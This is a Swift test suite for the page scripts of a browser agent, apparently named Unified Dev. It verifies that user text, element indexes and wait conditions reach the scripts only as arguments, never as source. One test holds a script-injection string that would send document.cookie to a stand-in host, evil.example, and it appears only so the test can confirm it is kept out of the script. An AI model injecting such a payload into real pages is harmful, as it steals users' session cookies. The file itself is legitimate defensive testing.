import Foundation
import Testing
@testable import Core

@Suite("The five scripts Unified Dev runs in a page", .tags(.security))
struct BrowserAgentScriptTests {
    @Test("no script carries the caller's text in its source")
    func textNeverReachesTheSource() {
        let nasty = "\"); window.location = 'https://evil.example/' + document.cookie; (\""
        let script = BrowserAgentScript.fill(BrowserAgentReference(index: 2), nasty)

        #expect(!script.body.contains("evil.example"))
        #expect(!script.body.contains(nasty))
        #expect(script.arguments["text"] == .text(nasty))
    }

    @Test("a reference reaches a script as a number, never as source")
    func referencesAreNumbers() {
        let script = BrowserAgentScript.click(BrowserAgentReference(index: 7))

        #expect(script.arguments["index"] == .number(7))
        #expect(!script.body.contains("e7"))
    }

    @Test("every script is a function body with no interpolation at all")
    func bodiesAreFixed() {
        let bodies = [
            BrowserAgentScript.outline,
            .click(BrowserAgentReference(index: 1)),
            .fill(BrowserAgentReference(index: 1), "anything"),
            .press(.enter, nil),
            .settled(.text("Saved")),
        ].map(\.body)

        for body in bodies {
            #expect(!body.contains("anything"))
            #expect(!body.contains("Saved"))
            #expect(body.contains("window.__unifieddevAgent"))
        }
    }

    @Test("a wait condition carries its needle as an argument")
    func waitCarriesItsNeedle() {
        let script = BrowserAgentScript.settled(.gone("Spinner"))

        #expect(script.arguments["gone"] == .text("Spinner"))
        #expect(script.arguments["text"] == nil)
    }

    @Test("the three waits are three bodies, so no needle is ever an undeclared name")
    func eachWaitHasItsOwnBody() {
        let load = BrowserAgentScript.settled(.load).body
        let appearing = BrowserAgentScript.settled(.text("x")).body
        let leaving = BrowserAgentScript.settled(.gone("x")).body

        #expect(load != appearing)
        #expect(appearing != leaving)
        #expect(BrowserAgentScript.settled(.load).arguments.isEmpty)
    }

    @Test("a key press is one of a fixed list, and anything else is refused by name", arguments: [
        "return", "cmd+s", "a", "", "KeyA", "f5",
    ])
    func keysAreAFixedList(raw: String) {
        let parsed = BrowserKeyPress.parse(raw)

        guard case .failure(let refusal) = parsed else {
            Issue.record("'\(raw)' was accepted as a key")
            return
        }
        #expect(refusal.sentence.contains("'enter'"))
    }

    @Test("the keys that are offered all parse")
    func everyOfferedKeyParses() {
        for key in BrowserKeyPress.allCases {
            guard case .success(let parsed) = BrowserKeyPress.parse(key.rawValue) else {
                Issue.record("\(key.rawValue) does not parse")
                return
            }
            #expect(parsed == key)
        }
    }

    @Test("a wait with neither text nor gone waits for the load, and both at once is refused")
    func waitParsing() {
        guard case .success(let load) = BrowserWaitCondition.parse(text: nil, gone: nil) else {
            Issue.record("a bare wait did not parse")
            return
        }
        #expect(load == .load)

        guard case .failure(let refusal) = BrowserWaitCondition.parse(text: "a", gone: "b") else {
            Issue.record("a wait for two things at once was accepted")
            return
        }
        #expect(refusal.sentence.contains("one"))
    }

    @Test("the seconds a wait takes are bounded, and a missing value takes the fallback")
    func secondsAreBounded() {
        guard case .success(let fallback) = BrowserWaitSeconds.parse(nil) else {
            Issue.record("a missing 'seconds' did not fall back")
            return
        }
        #expect(fallback == BrowserWaitSeconds.fallback)

        guard case .failure(let tooLong) = BrowserWaitSeconds.parse(.integer(120)) else {
            Issue.record("120 seconds was accepted")
            return
        }
        #expect(tooLong.sentence.contains("\(BrowserWaitSeconds.maximum)"))
    }

    @Test("a press with no element still declares one, so the body never reads a missing name")
    func aPageWidePressStillCarriesAnIndex() {
        let script = BrowserAgentScript.press(.enter, nil)

        #expect(script.arguments["index"] == .number(0))
        #expect(script.arguments["key"] == .text("enter"))
    }

    @Test("no script's body reads a name its own arguments do not declare")
    func bodiesOnlyReadWhatTheyDeclare() {
        let scripts: [BrowserAgentScript] = [
            .outline,
            .click(BrowserAgentReference(index: 1)),
            .fill(BrowserAgentReference(index: 1), "x"),
            .press(.enter, BrowserAgentReference(index: 1)),
            .press(.enter, nil),
            .settled(.load),
            .settled(.text("x")),
            .settled(.gone("x")),
        ]
        let names = ["index", "chars", "text", "gone", "key"]

        for script in scripts {
            let declared = Set(script.arguments.keys)
            let code = withoutStringLiterals(script.body)
            for name in names where !declared.contains(name) {
                #expect(
                    !code.contains(word: name),
                    "\(script) reads '\(name)', which callAsyncJavaScript will not declare"
                )
            }
        }
    }

    private func withoutStringLiterals(_ body: String) -> String {
        body.replacing(/"[^"\n]*"/, with: " ")
    }

    @Test("every key the enum offers is one the pressing script knows how to send")
    func theTwoKeyListsAgree() {
        let body = BrowserAgentScript.press(.enter, nil).body

        for key in BrowserKeyPress.allCases {
            #expect(body.contains("\(key.rawValue):"), "\(key.rawValue) is not in the table")
        }
    }

    @Test("every key the outline script writes is a key BrowserPageElement decodes")
    func theScriptAndTheStructAgree() throws {
        let body = BrowserAgentScript.outline.body
        let listed = try #require(body.range(of: "listed.push({"))
        let shape = body[listed.upperBound...]

        for key in ["role", "name", "value", "isPassword", "valueLength", "isDisabled", "isChecked", "depth"] {
            #expect(shape.contains("\(key):"), "the script does not send \(key)")
        }
    }

    @Test("a wait never settles on a page that is still loading its first bytes")
    func aWaitDoesNotWaitTwice() {
        #expect(!BrowserPaneCommand.wait(nil, .load, seconds: 5).readsPage)
        #expect(BrowserPaneCommand.outline(nil).readsPage)
    }

    @Test("a filling script reads the field back rather than reporting what it offered")
    func fillingReadsItsOwnWork() {
        let body = BrowserAgentScript.fill(BrowserAgentReference(index: 1), "x").body

        #expect(body.contains("var after"))
        #expect(body.contains("String(after)"))
    }

    @Test("a click and a fill both honour the page saying an element is disabled")
    func bothHonourAriaDisabled() {
        let bodies = [
            BrowserAgentScript.click(BrowserAgentReference(index: 1)).body,
            BrowserAgentScript.fill(BrowserAgentReference(index: 1), "x").body,
        ]

        for body in bodies {
            #expect(body.contains("aria-disabled"))
            #expect(body.contains("blocked(node)"))
        }
    }

    @Test("a field is secret when the page masks it, not only when its type says password")
    func maskingCountsAsAPassword() {
        let body = BrowserAgentScript.outline.body

        #expect(body.contains("-webkit-text-security"))
        #expect(body.contains("autocomplete"))
    }

    @Test("the number of seconds a wait takes is bounded at both ends", arguments: [
        JSONValue.integer(0), .integer(-5), .integer(31), .integer(600),
        .number(1e30), .number(-1e30), .string("5"), .bool(true),
    ])
    func secondsOutsideTheRangeAreRefused(value: JSONValue) {
        guard case .failure = BrowserWaitSeconds.parse(value) else {
            Issue.record("\(value) was accepted as a number of seconds")
            return
        }
    }

    @Test("the two ends of the range, and a whole number written as a decimal, are accepted")
    func secondsInsideTheRangeAreTaken() throws {
        #expect(try BrowserWaitSeconds.parse(.integer(BrowserWaitSeconds.minimum)).get() == 1)
        #expect(try BrowserWaitSeconds.parse(.integer(BrowserWaitSeconds.maximum)).get() == 30)
        #expect(try BrowserWaitSeconds.parse(.number(5.4)).get() == 5)
    }

    @Test("a wait for nothing but whitespace waits for the load rather than for whitespace")
    func whitespaceIsNotANeedle() throws {
        let parsed = try BrowserWaitCondition.parse(text: "   ", gone: nil).get()

        #expect(parsed == .load)
    }

    @Test("the world the scripts run in is named once")
    func theWorldIsNamedOnce() {
        #expect(BrowserAgentScript.world == "unified-dev-agent")
    }
}
